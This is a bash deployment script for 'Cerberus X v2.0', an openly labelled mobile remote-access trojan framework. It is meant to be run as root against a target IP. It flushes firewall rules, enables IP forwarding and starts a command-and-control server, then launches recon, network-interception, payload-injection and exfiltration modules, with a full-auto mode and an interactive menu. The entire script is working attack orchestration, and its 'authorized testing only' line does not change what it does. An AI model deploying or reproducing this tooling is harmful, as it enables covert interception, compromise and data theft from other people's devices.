#!/bin/bash
# ============================================================================
# CERBERUS X v2.0 - SURGICAL DEPLOYMENT ENGINE
# Advanced Mobile RAT Framework Deployment
# 
# Copyright (c) 2024 F1REW0LF
# License: MIT - For authorized security testing only
# ============================================================================

# ==================== CONFIGURATION ====================
INTERFACE="${INTERFACE:-eth0}"
C2_PORT="${C2_PORT:-8080}"
DASHBOARD_PORT="${DASHBOARD_PORT:-8443}"
KALI_IP=$(hostname -I | awk '{print $1}')
GATEWAY_IP=$(ip route | grep default | awk '{print $3}')
LOG_FILE="cerberus_$(date +%Y%m%d_%H%M%S).log"

# ==================== COLORS ====================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ==================== FUNCTIONS ====================
print_banner() {
    echo -e "${PURPLE}"
    echo "    ██████╗███████╗██████╗ ██████╗ ███████╗██████╗ ██╗   ██╗███████╗"
    echo "   ██╔════╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██║   ██║██╔════╝"
    echo "   ██║     █████╗  ██████╔╝██████╔╝█████╗  ██████╔╝██║   ██║███████╗"
    echo "   ██║     ██╔══╝  ██╔══██╗██╔══██╗██╔══╝  ██╔══██╗╚██╗ ██╔╝╚════██║"
    echo "   ╚██████╗███████╗██║  ██║██║  ██║███████╗██║  ██║ ╚████╔╝ ███████║"
    echo "    ╚═════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝"
    echo -e "${NC}"
    echo -e "${GREEN}                    X v2.0 - MOBILE RAT FRAMEWORK${NC}"
    echo -e "${YELLOW}          Advanced Mobile Device Testing & Security${NC}"
    echo -e "${CYAN}    Modules: Recon | Intercept | Inject | Exfil | Mirror${NC}"
    echo "============================================================================"
}

log() {
    local level="$1"
    local message="$2"
    local color="${NC}"
    
    case "$level" in
        "INFO") color="${GREEN}" ;;
        "WARN") color="${YELLOW}" ;;
        "ERROR") color="${RED}" ;;
        "DEBUG") color="${CYAN}" ;;
        *) color="${WHITE}" ;;
    esac
    
    echo -e "[$(date +'%H:%M:%S')] ${color}[$level]${NC} $message" | tee -a "$LOG_FILE"
}

check_root() {
    if [ "$EUID" -ne 0 ]; then
        log "ERROR" "Please execute as root (sudo)"
        exit 1
    fi
}

check_dependencies() {
    log "INFO" "Checking dependencies..."
    
    local deps=("python3" "node" "npm" "iptables" "hostapd" "dnsmasq" "airmon-ng")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        log "ERROR" "Missing dependencies: ${missing[*]}"
        log "INFO" "Install with: apt-get install ${missing[*]}"
        exit 1
    fi
    
    # Check Python modules
    python3 -c "import scapy, netfilterqueue, websocket" 2>/dev/null
    if [ $? -ne 0 ]; then
        log "ERROR" "Missing Python modules"
        log "INFO" "Install with: pip3 install -r requirements.txt"
        exit 1
    fi
    
    # Check Node modules
    npm list ws 2>/dev/null | grep -q "ws@"
    if [ $? -ne 0 ]; then
        log "INFO" "Installing Node modules..."
        cd c2_infrastructure && npm install ws express && cd ..
    fi
    
    log "INFO" "All dependencies satisfied"
}

setup_environment() {
    log "INFO" "Setting up environment..."
    
    # Create directories
    mkdir -p logs exfil_data
    
    # Generate SSL certs if needed
    if [ ! -f "/etc/ssl/private/cerberus.key" ]; then
        log "INFO" "Generating SSL certificates..."
        mkdir -p /etc/ssl/private /etc/ssl/certs
        openssl req -x509 -newkey rsa:4096 -keyout /etc/ssl/private/cerberus.key \
            -out /etc/ssl/certs/cerberus.crt -days 365 -nodes \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=cerberus.local"
    fi
    
    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    # Flush firewall
    iptables --flush 2>/dev/null
    iptables -t nat --flush 2>/dev/null
    
    log "INFO" "Environment ready"
}

start_c2() {
    log "INFO" "Starting C2 Central Brain..."
    
    cd c2_infrastructure
    node central_brain.js &
    C2_PID=$!
    cd ..
    
    sleep 3
    
    if ps -p $C2_PID > /dev/null; then
        log "INFO" "C2 Server running (PID: $C2_PID)"
        log "INFO" "WebSocket: ws://$KALI_IP:$C2_PORT"
        log "INFO" "Dashboard: https://$KALI_IP:$DASHBOARD_PORT"
    else
        log "ERROR" "C2 Server failed to start"
        exit 1
    fi
}

start_recon() {
    log "INFO" "Starting Recon Scanner..."
    
    python3 kernel_core/recon_scanner.py &
    RECON_PID=$!
    
    log "INFO" "Recon Scanner running (PID: $RECON_PID)"
}

start_interceptor() {
    log "INFO" "Starting Network Interceptor..."
    log "WARN" "Target: $TARGET_IP, Gateway: $GATEWAY_IP"
    
    python3 kernel_core/interceptor_v3.py -t $TARGET_IP -g $GATEWAY_IP -s &
    INTERCEPT_PID=$!
    
    log "INFO" "Interceptor running (PID: $INTERCEPT_PID)"
}

start_injector() {
    log "INFO" "Starting Payload Injector..."
    
    python3 kernel_core/injector_v4.py $TARGET_IP $KALI_IP &
    INJECT_PID=$!
    
    log "INFO" "Injector running (PID: $INJECT_PID)"
}

open_dashboard() {
    log "INFO" "Opening Dashboard..."
    
    if command -v xdg-open &> /dev/null; then
        xdg-open "https://$KALI_IP:$DASHBOARD_PORT" 2>/dev/null
    elif command -v firefox &> /dev/null; then
        firefox "https://$KALI_IP:$DASHBOARD_PORT" &
    else
        log "WARN" "Cannot open browser. Access: https://$KALI_IP:$DASHBOARD_PORT"
    fi
}

cleanup() {
    log "INFO" "Cleaning up resources..."
    
    # Kill processes
    kill $C2_PID 2>/dev/null
    kill $RECON_PID 2>/dev/null
    kill $INTERCEPT_PID 2>/dev/null
    kill $INJECT_PID 2>/dev/null
    
    # Flush firewall
    iptables --flush 2>/dev/null
    iptables -t nat --flush 2>/dev/null
    
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    log "INFO" "Cleanup complete"
}

show_menu() {
    echo ""
    echo -e "${BLUE}┌─────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC}  ${WHITE}CERBERUS X v2.0 - MAIN MENU${NC}                      ${BLUE}│${NC}"
    echo -e "${BLUE}├─────────────────────────────────────────────────────────┤${NC}"
    echo -e "${BLUE}│${NC}  1. ${GREEN}Full Auto${NC}    - Deploy everything              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  2. ${GREEN}Recon Only${NC}   - Network discovery              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  3. ${GREEN}Inject Only${NC}  - Payload injection              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  4. ${GREEN}Dashboard${NC}   - Open C2 dashboard              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  5. ${RED}Cleanup${NC}     - Stop all processes              ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}  6. ${RED}Exit${NC}       - Exit framework                  ${BLUE}│${NC}"
    echo -e "${BLUE}└─────────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ==================== MAIN ====================
# Trap signals
trap cleanup SIGINT SIGTERM

# Parse arguments
TARGET_IP=""
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target)
            TARGET_IP="$2"
            shift 2
            ;;
        -g|--gateway)
            GATEWAY_IP="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "  -t, --target TARGET     Target IP address"
            echo "  -g, --gateway GATEWAY  Gateway IP address"
            echo "  -h, --help             Show this help"
            exit 0
            ;;
        *)
            shift
            ;;
    esac
done

# Main execution
print_banner
check_root
check_dependencies

if [ -n "$TARGET_IP" ]; then
    # Auto deployment mode
    log "INFO" "Starting auto deployment..."
    setup_environment
    start_c2
    sleep 2
    start_recon
    start_interceptor
    start_injector
    sleep 2
    open_dashboard
    
    log "INFO" "Deployment complete. Press Ctrl+C to stop."
    
    # Keep running
    while true; do
        sleep 1
    done
else
    # Interactive mode
    setup_environment
    start_c2
    
    while true; do
        show_menu
        read -p "[>] Selection: " choice
        
        case "$choice" in
            1)
                if [ -z "$TARGET_IP" ]; then
                    read -p "[>] Target IP: " TARGET_IP
                fi
                start_recon
                start_interceptor
                start_injector
                open_dashboard
                ;;
            2)
                start_recon
                ;;
            3)
                if [ -z "$TARGET_IP" ]; then
                    read -p "[>] Target IP: " TARGET_IP
                fi
                start_injector
                ;;
            4)
                open_dashboard
                ;;
            5)
                cleanup
                ;;
            6)
                cleanup
                exit 0
                ;;
            *)
                log "WARN" "Invalid selection"
                ;;
        esac
    done
fi
